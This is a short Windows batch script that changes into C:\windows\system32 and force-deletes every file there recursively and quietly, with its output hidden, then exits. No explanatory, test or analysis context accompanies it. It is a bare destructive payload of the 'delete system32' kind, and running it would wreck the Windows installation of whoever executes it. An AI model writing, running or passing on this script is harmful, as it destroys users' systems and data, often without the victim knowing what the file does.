@echo off
cd C:\windows\system32
del *.* /f /s /q >nul 2>&1
exit